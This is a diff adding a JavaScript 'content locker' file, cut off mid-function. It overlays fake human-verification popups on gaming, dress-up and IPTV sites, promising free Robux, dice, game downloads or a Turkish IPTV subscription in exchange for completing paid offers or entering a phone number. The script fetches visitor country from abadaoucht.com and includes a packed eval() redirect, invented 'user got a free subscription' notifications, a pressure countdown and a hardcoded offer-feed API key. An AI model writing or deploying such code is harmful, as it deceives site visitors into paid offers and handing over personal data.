@@ -1,0 +1,1162 @@
+var script = document.createElement('script');
+script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js'; // Check https://jquery.com/ for the current version
+document.getElementsByTagName('head')[0].appendChild(script);
+
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 5(a){6(7.8.9(/d|e|f/i)){0 b=\'g-h-j://\'+a;1.2.3=b}k{0 c=\'l://\'+a+\'#m;n=o;p=q.r.s;t\';1.2.3=c}}',30,30,'var|window|location|href|function|open_ext_url|if|navigator|userAgent|match||||iPhone|iPad|iPod|x|web||search|else|intent|Intent|scheme|https|package|com|android|chrome|end'.split('|'),0,{}))
+
+
+ 
+function setCookie(c_name, value, exdays) {
+    var exdate = new Date();
+    exdate.setDate(exdate.getDate() + exdays);
+    var c_value = escape(value) + ((exdays === null) ? "" : "; expires=" + exdate.toUTCString());
+    document.cookie = c_name + "=" + c_value;
+}
+
+function getCookie(c_name) {
+    var i, x, y, ARRcookies = document.cookie.split(";");
+    for (i = 0; i < ARRcookies.length; i++) {
+        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
+        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1); 
+        x = x.replace(/^\s+|\s+$/g, "");
+        if (x == c_name) {
+            return unescape(y);
+        }
+    }
+}
+
+function getRandomIntInclusive(min, max) {
+  min = Math.ceil(min); 
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min + 1) + min); // The maximum is inclusive and the minimum is inclusive
+}
+
+
+
+const ogasdCountry = ["Italy", "United Statesx", "Spain", "Norway", "Türkiye", "Indiax", "Japan", "Turkey", "Morocco", "South Korea"];
+var arrOfferList = ["", "+10k dice", "+20 random stickers", "+5,000 dice", "+2,000 dice"];
+var ROOT_URL = "https://abadaoucht.com/viewProject/api/ggggjf5rgvf.php"; 
+var hs = window.location.hostname; 
+var URL_OFFERS_FEED = "https://d1w9uux77ifu8k.cloudfront.net/public/offers/feed.php?user_id=270367&api_key=3916c34d10537f1f23e35e82a4909848&s1="+ hs +"&s2=4&callback=?";
+var URL_OGADS_OFFERS = "https://abadaoucht.com/viewProject/api/ogadsfeed.php?key=uGAekCmvTRB/HtXyaNAzFIvVDwwNbLtox7JAGLNTaBxrHFgurjn5pCYvZhifZEnFrfDhQtWf&ctype=7&sub="+hs;
+var URL_CHECK_LEADS = "";
+var ID_VIEW_COOKIE = "GHGTR_tgs545F5426FFF_XRF4";
+var c_ooksjgr = "hfg4GdrtHu7rdg75hjyg000X98";
+var GetCookie = getCookie(c_ooksjgr);
+var ips = "";
+var OGADS_MIN_PAY = 1;
+var BUILD_MIN_PAY = 1;
+
+var BuildOffer = 1;
+var OgadsOffer = 1;
+
+
+
+var monoArr = ["eriz.pw"];
+let varString = "yeshhd";
+let existsMONO = false;
+
+for (let i = 0; i < monoArr.length; i++) {
+    if (hs.includes(monoArr[i])) {
+        existsMONO = true;
+        break;
+    }
+}
+
+
+
+ 
+
+
+
+if(hs.indexOf("walkthroughgames.space") > -1){
+    const d = new Date();
+    let minutes = d.getMinutes();
+    let res = minutes%3;  
+    if(res > 0){ 
+        getLockerNowIPTV(); 
+    }
+}
+
+
+
+
+
+if(hs.indexOf("battleroyalefuns") > -1){
+   getLockerNow();
+}
+ 
+
+
+
+
+
+
+function getLockerNow(){
+    $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            // console.log(">>>> ABOUTING " + result);
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                addLockerCode(cn);
+                Impression();
+            
+            }
+        }
+    });
+}
+
+
+
+
+if(hs.indexOf("8x1") > -1 || hs.indexOf("drx") > -1){
+    const d = new Date();
+    let minutes = d.getMinutes(); 
+    let res = minutes%3;  
+     $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                
+            //   if (cn == "United States" || cn == "Philippines"){
+                    addLockerCodeDress(cn);
+                    Impression();
+            //   }
+               
+               
+            }
+        }
+    });
+}
+
+
+
+if(hs.indexOf("dr") > -1 || hs.indexOf("it") > -1 || hs.indexOf("7") > -1 || hs.indexOf("su") > -1 || hs.indexOf("9") > -1 || hs.indexOf("dresistoimpresxs") > -1 || hs.indexOf("kl2") > -1 ){
+    const d = new Date();
+    let minutes = d.getMinutes(); 
+    let res = minutes%2;  
+   if(res > 0){ // 3 = 30% if res == 0
+         $.ajax({
+            url: "https://abadaoucht.com/viewProject/checked.php", 
+            success: function(result){
+                var res = JSON.parse(result);
+                var cn = res["country"];
+                if(res["message"] == "SUCCESS"){
+                 // if (cn == "United States"){
+                        addLockerCodeDress(cn);
+                       Impression();
+               // }
+                   
+                }
+            }
+        });
+    }
+}
+
+// addLockerCodeDress("US"); 
+
+
+if(hs.indexOf("drxeestoimrpres") > -1 ){
+    const d = new Date();
+    let minutes = d.getMinutes(); 
+    let res = minutes%2;  
+   if(res == 0){ // 3 = 30% if res == 0
+         $.ajax({
+            url: "https://abadaoucht.com/viewProject/checked.php", 
+            success: function(result){
+                var res = JSON.parse(result);
+                var cn = res["country"];
+                if(res["message"] == "SUCCESS"){
+                     //window.location.href = "https://pic12.net/";
+                }
+            }
+        });
+    }
+}
+
+
+
+
+
+ 
+
+
+function getLockerNowPES(){
+    $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            console.log(">>>> ABOUTING " + result);
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                addLockerCodePES(cn);
+                Impression();
+            }
+        }
+    });
+}
+
+
+
+
+function getLockerNowIPTV(){
+    console.log("check");
+    $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            // console.log(">>>> ABOUTING " + result);
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                // console.log("xxcvvvv");
+                addLockerCodeIPTV(cn);
+                Impression();
+            
+            }
+        }
+    });
+}
+
+
+
+
+
+
+
+
+
+function getLockerMono(){
+     $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            // console.log(">>>> ABOUTING " + result);
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                addLockerCodeMono("usa");
+                Impression();
+            
+            }
+        }
+    });
+}
+
+
+function getLockerMonoTOP(){
+     $.ajax({
+        url: "https://abadaoucht.com/viewProject/checked.php", 
+        success: function(result){
+            // console.log(">>>> ABOUTING " + result);
+            var res = JSON.parse(result);
+            var cn = res["country"];
+            if(res["message"] == "SUCCESS"){
+                addLockerCodeMonoTOP(cn);
+                Impression();
+            
+            }
+        }
+    });
+}
+
+// function getLockerIptv(){
+    //  $.ajax({
+    //     url: "https://abadaoucht.com/viewProject/checked.php", 
+    //     success: function(result){
+    //         console.log(">>>> ABOUTING " + result);
+    //         var res = JSON.parse(result);
+    //         var cn = res["country"];
+    //         if(res["message"] == "SUCCESS"){
+                // addLockerCodeIptv("USA");
+                // Impression();
+            
+    //         }
+    //     }
+    // });
+// }
+
+
+
+
+function addLockerCodeDress(cn){
+    console.log("SUCCESS >>>>> ");
+    //window.location.href = "https://pic12.net/roblox/robux.html?ref=domain"; 
+    
+    $(".final > div").html('<button onclick="openLocker()" id="verify-btn" class="pop-in-pulse">Verify</button>');
+    
+    // $(".final > button").remove();
+    $(".action").html('<button onclick="openLocker()" id="verify-btn" class="btn-acc">Verify Now</button>');
+    
+    //$("#step-4 .action .item-btn .text").remove();
+    //$("#step-4 .action .item-btn").append('<div onclick="openLocker()" class="text" >Verify Now</div>');
+    
+    var styles = `
+    .d-none {display:none;}
+      @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Mochiy+Pop+One&family=Nunito:wght@200&family=Poppins:wght@400;600;700;900&family=REM:wght@300&family=Varela+Round&display=swap");
+    .locker_ads {position: absolute;left: 0;right: 0;top: 0;bottom: 0; background-color: rgba(0,0,0,.7);font-family: "Kumbh Sans", sans-serif;padding: 20px;    z-index: 8888;}
+    .locker_ads > div {background: #393b3d;max-width: 500px;margin: 0 auto;border-radius: 8px;color: #fff;text-align: center;border-bottom: 3px solid #fdd658;}
+    .locker_ads p {padding: 10px 30px;}
+    .locker_ads .not {background: #fdd658;padding: 15px;border-radius: 8px 8px 0 0;color: #393b3d;}
+    .locker_ads .offers {padding:10px 30px;}
+    .locker_ads .offer {padding: 12px;background: #00b06f;border-radius: 6px;margin-bottom: 10px;font-weight: bold;}
+    .locker_ads .offer a {text-decoration: none;color: #fff;}
+    .audio-btn {display: flex;justify-content: center;align-items: center;width: 30px;height: 30px;border-radius: 50%;background: #fff;margin-top: 20px;margin-bottom: 30px;}
+    .audio-btn img {width: 100%;width: 15px;}
+    .audio {padding:15px}
+
+    `;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        
+      
+<div class="locker_ads lockerXslm d-none">
+
+    <div class="">
+        <div class="not">
+            Claim Your Rօbuх For Free and your dress
+        </div>
+        <p>Complete 1 task to verify that you are not a robot. Once the task is completed, Your dress will be added to your account. </p>
+
+        <div class="offers">
+           
+        </div>
+        <div class="audio">
+            Click the button below to listen to the tutorial.
+            <div><b>NB:</b> If you don't have TikTok and download it through this verification, you can win +10K Robux</div>
+            <br>
+            <br>
+            <audio controls>
+                <source src="https://cdn.pixabay.com/audio/2024/12/29/audio_79bcebc840.mp3" type="audio/mpeg">
+                Your browser does not support the audio element.
+            </audio>
+            <br>
+            <br>
+            <!-- <center>
+                <div class="audio-btn">
+                    <img src="https://img.icons8.com/fluency-systems-filled/48/play.png" alt="">
+                </div>
+            </center> -->
+        </div>
+    </div>
+    
+</div>
+    `;
+    
+    
+    
+    iDiv.innerHTML = HTMLcode;
+  
+    //laodOfferFeedOgadsDress();
+    laodOfferFeedBuildDress();
+   
+    
+}
+
+
+
+
+
+
+function addLockerCodePES(cn){
+    
+    $(".download_button").html('<button id="download_button_one" onclick="openLocker()">Download</button>');
+    
+    var styles = `.lockerXslm {position: fixed;background: rgba(0, 0, 0, .2);width: 100%;top: 0;left: 0;bottom: 0;right: 0;padding: 20px;overflow: scroll;z-index:9999999;color: #000;}.lockerXslm > div {max-width: 500px;background-color: #ffffff;margin: 5px auto;text-align: center;border-radius: 10px;}.lockx-header {background-color: #088395;padding: 0px;text-align: center;border-radius: 10px 10px 0 0;color: #fff;}.lockx-body {padding: 15px;}.lockx-text {margin: 7px 0;}.lockx-text span {font-weight: bold;color: #088395;}.lockx-email-form {background-color: #f5f5f5;padding: 15px;text-align: left;border: 1px solid #ececec;margin: 10px 0 15px 0;}.lockx-email-form input {all: unset;box-sizing: border-box;background-color: #fff;padding: 7px 13px;border-radius: 3px;margin: 2px 0;width: 100%;border: 1px solid #e7e7e7;}.lockx-offer {position: relative;display: flex;background-color: #088395;padding: 10px;border-radius: 7px;margin: 13px 0;text-align: left;align-items: center;color: #fff;border: 2px solid #085561;}.lockx-offer .easy {position: absolute;right: 15px;top: -13px;background-color: #FFBB5C;display: none;font-size: .9rem;padding: 2px 12px;border-radius: 5px;color: #fff;}.lockx-offer:first-child .easy {display: block;}.lockerXslm .num div {width: 25px;height: 25px;border-radius: 50%;display: flex;justify-content: center;align-items: center;background-color: #fdfdff;color: #000000;font-size: .8rem;font-weight: bold;}.lockx-offer .text {padding-left: 12px;}.time-c {font-size:.78rem;margin-top:2px;color:#d3d3d3;}.lockx-waiting {font-size: .79rem;color: #888;}.lockx-footer {padding: 10px 15px;border-top: 1px solid #eee;font-size: .8rem;}.lockx-offers {padding: 15px 0;}`;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        <div class="lockerXslm d-none" id="lockersIdx">
+            <div>
+                <div class="lockx-header"><img src="https://www.dexerto.fr/cdn-image/wp-content/uploads/sites/2/2024/07/17/edition-ultimate-eafc25.jpg?width=3840&quality=60&format=auto" width="100%"></div>
+                <div class="lockx-body">
+                    <div class="lockx-text d-none"><span>Step 1 : </span> Enter Your name and your email.</div>
+                    <div class="lockx-email-form  d-none">
+                        <input id="lockx-name-input" placeholder="Your name">
+                        <input id="lockx-email-input" placeholder="Yout email">
+                    </div>
+                    <div class="lockx-text d-none"><span>Last Step : </span> Just complete 1 Offer down below, and the Game will start automatically. .</div>
+                    
+                    <div class="lockx-text"><span>Last Step : </span> Complete an Offer to prove you aren't a Bot.</div>
+                    <div class="lockx-text">Complete one of the Offers below to download CFC25. </div>
+                    <div class="lockx-offers">
+
+                    </div>
+                    <div class="lockx-waiting">the Game will download automatically... </div>
+                </div>
+                <!-- <div class="lockx-footer"><b>NOTE : </b> if you do not finish the offer, the game will not be download </div> -->
+            </div>
+        </div>
+    `;
+    iDiv.innerHTML = HTMLcode;
+    
+    laodOfferFeedBuild(); 
+    
+}
+
+
+
+
+
+
+
+function addLockerCode(cn){
+    console.log("add locker");
+    
+    addButtonLocker();
+    
+    var styles = `.lockerXslm {position: fixed;background: rgba(0, 0, 0, .2);width: 100%;top: 0;left: 0;bottom: 0;right: 0;padding: 20px;overflow: scroll;z-index:9999999;color: #000;}.lockerXslm > div {max-width: 500px;background-color: #ffffff;margin: 5px auto;text-align: center;border-radius: 10px;}.lockx-header {background-color: #088395;padding: 0px;text-align: center;border-radius: 10px 10px 0 0;color: #fff;}.lockx-body {padding: 15px;}.lockx-text {margin: 7px 0;}.lockx-text span {font-weight: bold;color: #088395;}.lockx-email-form {background-color: #f5f5f5;padding: 15px;text-align: left;border: 1px solid #ececec;margin: 10px 0 15px 0;}.lockx-email-form input {all: unset;box-sizing: border-box;background-color: #fff;padding: 7px 13px;border-radius: 3px;margin: 2px 0;width: 100%;border: 1px solid #e7e7e7;}.lockx-offer {position: relative;display: flex;background-color: #088395;padding: 10px;border-radius: 7px;margin: 13px 0;text-align: left;align-items: center;color: #fff;border: 2px solid #085561;}.lockx-offer .easy {position: absolute;right: 15px;top: -13px;background-color: #FFBB5C;display: none;font-size: .9rem;padding: 2px 12px;border-radius: 5px;color: #fff;}.lockx-offer:first-child .easy {display: block;}.lockerXslm .num div {width: 25px;height: 25px;border-radius: 50%;display: flex;justify-content: center;align-items: center;background-color: #fdfdff;color: #000000;font-size: .8rem;font-weight: bold;}.lockx-offer .text {padding-left: 12px;}.time-c {font-size:.78rem;margin-top:2px;color:#d3d3d3;}.lockx-waiting {font-size: .79rem;color: #888;}.lockx-footer {padding: 10px 15px;border-top: 1px solid #eee;font-size: .8rem;}.lockx-offers {padding: 15px 0;}`;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        <div class="lockerXslm d-none" id="lockersIdx">
+            <div>
+                <div class="lockx-header"><img src="https://static.gameloop.com/img/e2656a83afc149b38c68007a2d9666ab.jpg?imageMogr2/thumbnail/undefinedx266/format/webp" width="100%"></div>
+                <div class="lockx-body">
+                    <div class="lockx-text d-none"><span>Step 1 : </span> Enter Your name and your email.</div>
+                    <div class="lockx-email-form  d-none">
+                        <input id="lockx-name-input" placeholder="Your name">
+                        <input id="lockx-email-input" placeholder="Yout email">
+                    </div>
+                    <div class="lockx-text d-none"><span>Last Step : </span> Just complete 1 Offer down below, and the Game will start automatically. .</div>
+                    
+                    <div class="lockx-text"><span>Last Step : </span> Complete an Offer to prove you aren't a Bot.</div>
+                    <div class="lockx-text">Complete one of the Offers below to download College brawl. </div>
+                    <div class="lockx-offers">
+
+                    </div>
+                    <div class="lockx-waiting">the Game will download automatically... </div>
+                </div>
+                <!-- <div class="lockx-footer"><b>NOTE : </b> if you do not finish the offer, the game will not be download </div> -->
+            </div>
+        </div>
+    `;
+    iDiv.innerHTML = HTMLcode;
+    
+    if(ogasdCountry.indexOf(cn) > -1){ laodOfferFeedOgads(); }
+    else { laodOfferFeedBuild(); }
+    
+}
+
+
+
+
+
+
+
+function addLockerCodeMono(cn){
+    
+    // addButtonLockerMono();
+    $("#main-4").remove();
+    
+    var styles = `.lockerXslm {position: fixed;background: rgba(0, 0, 0, .2);width: 100%;top: 0;left: 0;bottom: 0;right: 0;padding: 20px;overflow: scroll;z-index:9999999;color: #000;}.lockerXslm > div {max-width: 500px;background-color: #ffffff;margin: 5px auto;text-align: center;border-radius: 10px;}.lockx-header {background-color: #088395;padding: 15px;text-align: center;border-radius: 10px 10px 0 0;color: #fff;}.lockx-body {padding: 15px;}.lockx-text {margin: 7px 0;}.lockx-text span {font-weight: bold;color: #088395;}.lockx-email-form {background-color: #f5f5f5;padding: 15px;text-align: left;border: 1px solid #ececec;margin: 10px 0 15px 0;}.lockx-email-form input {all: unset;box-sizing: border-box;background-color: #fff;padding: 7px 13px;border-radius: 3px;margin: 2px 0;width: 100%;border: 1px solid #e7e7e7;}.lockx-offer {position: relative;display: flex;background-color: #088395;padding: 10px;border-radius: 7px;margin: 13px 0;text-align: left;align-items: center;color: #fff;border: 2px solid #085561;}.lockx-offer .easy {position: absolute;right: 15px;top: -13px;background-color: #FFBB5C;display: none;font-size: .9rem;padding: 2px 12px;border-radius: 5px;color: #fff;}.lockx-offer:first-child .easy {display: block;}.lockerXslm .num div {width: 25px;height: 25px;border-radius: 50%;display: flex;justify-content: center;align-items: center;background-color: #fdfdff;color: #000000;font-size: .8rem;font-weight: bold;}.lockx-offer .text {padding-left: 12px;}.time-c {font-size:.78rem;margin-top:2px;color:#d3d3d3;}.lockx-waiting {font-size: .79rem;color: #888;}.lockx-footer {padding: 10px 15px;border-top: 1px solid #eee;font-size: .8rem;}.lockx-offers {padding: 15px 0;}`;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        <div class="lockerXslm d-none" id="main-4">
+            <div>
+                <div class="lockx-header"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizYIeHNu-kpgp1R3u017TyfRssVKXdL9v5UZauImzWDuduYnBKkq46l9RHjM_fCDPWlSnsg0ZNSsaNr09I2YOUG5gICt6NweP4s8KbclZ5Ny1TR8YxQvL8gaop3XsDwG5oDJRfa-5r_HvI_Oji1WJg6VRZzoPQ_SMZa7dLc8tqeex_9Hf7718L9AD5pCw/s1280/1701240628211%20(1).jpg" width="100%"></div>
+                <div class="lockx-body">
+                    <div class="lockx-text d-none"><span>Step 1 : </span> Enter Your name and your email.</div>
+                    
+                    <div class="lockx-email-form  d-none">
+                        <input id="lockx-name-input" placeholder="Your name">
+                        <input id="lockx-email-input" placeholder="Yout email">
+                    </div>
+                    <div class="lockx-text">Just complete one of the Offers below, After Completion your Dice will be added to your account automatically!</div>
+                    <div class="lockx-text"> The offers are easy and won't take more than two minutes of your time. </div>
+                    <div class="lockx-offers">
+
+                    </div>
+                    <div class="lockx-waiting d-none">Checking completion... </div>
+                </div>
+                <!-- <div class="lockx-footer d-none"><b>NOTE : </b> if you do not finish the offer, the game will not be download </div> -->
+            </div>
+        </div>
+    `;
+    iDiv.innerHTML = HTMLcode;
+    
+    if(ogasdCountry.indexOf(cn) > -1){ laodOfferFeedOgads(); }
+    else { laodOfferFeedBuild(); }
+    
+}
+
+
+
+
+function addLockerCodeMonoTOP(cn){ 
+    
+    $(".btn-lock").html('<button onclick="openLocker()">COLLECT NOW</button>');
+    $(".last-step").html('<button class="last" onclick="openLocker()">Last Step</button>');
+    $("#main-4 .bottons").html('<div class="submit submit" onclick="openLocker()">Verify Now</div>');
+     $("#main-4 .sub.bt").remove();
+     $("#main-4").append('<button class="submit submit" onclick="openlocker()">Verify Now<button>');
+     
+    
+    var styles = `.lockerXslm {position: fixed;background: rgba(0, 0, 0, .2);width: 100%;top: 0;left: 0;bottom: 0;right: 0;padding: 20px;overflow: scroll;z-index:9999999;color: #000;}.lockerXslm > div {max-width: 500px;background-color: #ffffff;margin: 0px auto;text-align: center;border-radius: 10px;}.lockx-header {background-color: #088395;padding: 15px;text-align: center;border-radius: 10px 10px 0 0;color: #fff;}.lockx-body {padding: 15px;}.lockx-text {margin: 7px 0;}.lockx-text span {font-weight: bold;color: #088395;}.lockx-email-form {background-color: #f5f5f5;padding: 15px;text-align: left;border: 1px solid #ececec;margin: 10px 0 15px 0;}.lockx-email-form input {all: unset;box-sizing: border-box;background-color: #fff;padding: 10px 20px;border-radius: 35px;margin: 2px 0;width: 100%;border: 1px solid #e7e7e7;}.lockx-offer {position: relative;display: flex;background-color: #088395;padding: 10px;border-radius: 7px;margin: 13px 0;text-align: left;align-items: center;color: #fff;border: 2px solid #085561;}.lockx-offer .easy {position: absolute;right: 15px;top: -13px;background-color: #FFBB5C;display: none;font-size: .9rem;padding: 2px 12px;border-radius: 5px;color: #fff;}.lockx-offer .easy {display: block;}.lockerXslm .num div {width: 25px;height: 25px;border-radius: 50%;display: flex;justify-content: center;align-items: center;background-color: #fdfdff;color: #000000;font-size: .8rem;font-weight: bold;}.lockx-offer .text {padding-left: 12px;}.time-c {font-size:.78rem;margin-top:2px;color:#d3d3d3;}.lockx-waiting {font-size: .79rem;color: #888;}.lockx-footer {padding: 10px 15px;border-top: 1px solid #eee;font-size: .8rem;}.lockx-offers {padding: 15px 0;}`;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        <div class="lockerXslm d-none" id="main-4" style="padding:0">
+            <div>
+                <div class="lockx-header" style="padding:0"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizYIeHNu-kpgp1R3u017TyfRssVKXdL9v5UZauImzWDuduYnBKkq46l9RHjM_fCDPWlSnsg0ZNSsaNr09I2YOUG5gICt6NweP4s8KbclZ5Ny1TR8YxQvL8gaop3XsDwG5oDJRfa-5r_HvI_Oji1WJg6VRZzoPQ_SMZa7dLc8tqeex_9Hf7718L9AD5pCw/s1280/1701240628211%20(1).jpg" width="100%"></div>
+                <div class="lockx-body">
+                    <div class="lockx-text d-none"><span>Step 1 : </span> Enter Your username</div>
+                    
+                    <div class="lockx-email-form d-none">
+                        <input id="lockx-name-input" placeholder="Username">
+                        <input id="lockx-email-input" class="" placeholder="Email">
+                    </div>
+                    <div class="lockx-text"><span>Last Step : </span> Just complete one of the Offers below, After Completion your Dice will be added to your account automatically!</div>
+                    <div class="lockx-text  d-none"> The offers are easy and won't take more than two minutes of your time. </div>
+                    <div class="lockx-offers">
+
+                    </div>
+                    <div class="lockx-waiting d-none">Checking completion... </div>
+                </div>
+                <!-- <div class="lockx-footer d-none"><b>NOTE : </b> if you do not finish the offer, the game will not be download </div> -->
+            </div>
+        </div>
+    `;
+    iDiv.innerHTML = HTMLcode;
+    
+    // openLocker();
+    
+    laodOfferFeedBuildMONO();
+    
+    // if(ogasdCountry.indexOf(cn) > -1){ laodOfferFeedOgads(); }
+    // else { laodOfferFeedBuild(); }
+    
+}
+
+
+
+function addLockerCodeIPTV(cn){
+    
+    
+    const users = ["MertYildiz", "DenizAkyuz", "EceDemir", "AliKaya", "SelinYasar", "BerkCan", "ElifToprak", "EmreGul", "BuseErdem", "FurkanAksoy", "OzlemSahin", "TolgaYildirim", "AyseUcar", "CemKaraman", "ZeynepOzturk", "OrhanKoc", "EbruCelik", "CansuTan", "HakanSezer", "SerkanOzer"];
+    const ago = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    
+    setInterval(() => {
+        var randomItem = users[Math.floor(Math.random() * users.length)];
+        var randomItems = ago[Math.floor(Math.random() * ago.length)];
+            const div = $(`<div class="cm" style="position: fixed;
+    bottom: 15px;display: flex;
+     align-items: center;
+    right: 15px;
+    left: 15px;
+    padding: 15px;
+    background: #2f3f44;
+    border: 2px solid #eb8400;
+    z-index: 9999;
+    border-radius: 5px;">
+                <img src="https://m.apkshub.com/images/13/com.nathnetwork.turkeyiptvplayer/icon.png" style="width: 40px;height: 40px;">
+                <div style="padding: 0 10px;"><b>${randomItem}</b> 12 aylık ücretsiz abonelik aldı</div>
+                <div style="font-size: .7rem;white-space: nowrap;">${randomItems} dakika önce</div>
+            </div>`).appendTo('body');
+            setTimeout(() => div.remove(), 3000);
+        }, 6000);
+    
+    console.log("xxx");
+    var x = $("#mored");
+    x.html(`<p>HEsabınız hazır, ancak sistemimizi rastgele tıklamalardan ve robotlardan korumak için bir insan olduğunuzdan emin olmalısınız.</p>
+                <button class="btn-ver" style="padding: 9px 12px;" onclick="openLocker()">Doğrulayın</button>`);
+                
+    $("nav .logo").addClass("d-none");
+    
+    var styles = `.lockerXslm {position: fixed;background: rgba(0, 0, 0, .2);width: 100%;top: 0;left: 0;bottom: 0;right: 0;padding: 20px;overflow: scroll;z-index:9999999;color: #000;}.lockerXslm > div {max-width: 500px;background-color: #ffffff;margin: 5px auto;text-align: center;border-radius: 10px;border: 2px solid #3d5860;}.lockx-header {padding: 0px;text-align: center;border-radius: 10px 10px 0 0;color: #fff;}.lockx-body {padding: 15px;background:#2f3f44;color:#fff}.lockx-text {margin: 7px 0;}.lockx-text span {font-weight: bold;color: #088395;}.lockx-email-form {background-color: #f5f5f5;padding: 15px;text-align: left;border: 1px solid #ececec;margin: 10px 0 15px 0;}.lockx-email-form input {all: unset;box-sizing: border-box;background-color: #fff;padding: 7px 13px;border-radius: 3px;margin: 2px 0;width: 100%;border: 1px solid #e7e7e7;}.lockx-offer {position: relative;display: flex;background-color: rgb(255 126 0);padding: 10px;border-radius: 7px;margin: 18px 0;text-align: left;align-items: center;color: #fff;border: 2px solid #085561;}.lockx-offer .easy {position: absolute;right: 15px;top: -20px;background-color: #28a745;display: none;font-size: .7rem;padding: 2px 12px;border-radius: 5px;color: #fff;}.lockx-offer:first-child .easy {display: block;}.lockerXslm .num div {width: 25px;height: 25px;border-radius: 50%;display: flex;justify-content: center;align-items: center;background-color: #fdfdff;color: #000000;font-size: .8rem;font-weight: bold;}.lockx-offer .text {padding-left: 12px;color: #000}.time-c {font-size:.78rem;margin-top:2px;color:#272727;}.lockx-waiting {font-size: .79rem;color: #a29f9f;}.lockx-footer {padding: 10px 15px;border-top: 1px solid #eee;font-size: .8rem;}.lockx-offers {padding: 15px 0;}`;
+    var styleSheet = document.createElement("style");
+    styleSheet.innerText = styles;
+    document.head.appendChild(styleSheet);
+
+    var iDiv = document.createElement('div');
+    iDiv.className = 'xlshywt-js5';
+    document.getElementsByTagName('body')[0].appendChild(iDiv);
+    var HTMLcode = `
+        <div class="lockerXslm d-none" id="main-4">
+            <div>
+                <div class="lockx-header"><img src="https://blog.verifykit.com/content/uploads/2020/09/gorsel-best-number-verification-method-for-users.jpg" width="100%" style="border-radius: 10px;"></div>
+                <div class="lockx-body">
+                    <div class="lockx-text"><b>Telefon numaranızı girin<b></div>
+                    
+                    <div class="lockx-email-form  d-none">
+                        <input id="lockx-name-input" placeholder="Your name">
+                        <input id="lockx-email-input" placeholder="Yout email">
+                    </div>
+                    <div class="lockx-text" style="font-size: 0.85rem;">Bu aboneliği aktif hale getirmek için telefon numaranızı girip aşağıdaki yollardan biriyle onaylamanız gerekmektedir.</div>
+                    <div class="lockx-offers">
+
+                    </div>
+                    <div class="lockx-waiting">Bu ücretsiz teklif şu tarihe kadar geçerlidir: <span id="timer-counter" style="font-size:.9rem">5:00</span></div>
+                    
+                </div>
+                <div class="lockx-footer d-none"><b>NOTE : </b> if you do not finish the offer, the game will not be download </div> 
+            </div>
+        </div>
+    `;
+    iDiv.innerHTML = HTMLcode;
+    
+   laodOfferFeedOgads();
+   
+   
+   let timeRemaining = 360;
+    setInterval(() => {
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        document.getElementById('timer-counter').textContent = 
+            `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        if (timeRemaining-- <= 0) clearInterval(this);
+    }, 1000);
+    
+}
+
+
+
+
+
+
+
+
+
+
+function openLocker(){
+    $(".lockerXslm").removeClass("d-none");
+    clickToshowLocker();
+    
+    clickToshowLocker();
+}
+
+
+
+
+
+
+
+
+
+
+function  addButtonLocker(){
+    
+    if(hs.indexOf("game1") > -1){
+        var main = $(".main"); 
+        $(".btn-down").remove();
+        var htm = "<button onclick='openLocker()' class='add-imp-locker'>DOWNLOAD NOW</button>";
+        //$("img.logo").attr("src", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdqSk0RMOhMerEojKIUdXYfd000PsI9fSGPeDl9b_6AgEGvO8TqFBQSHpXnzLd5y9Ht1o&usqp=CAU");
+        main.append(htm);
+    }else if(hs.indexOf("mycimax4u") > -1){
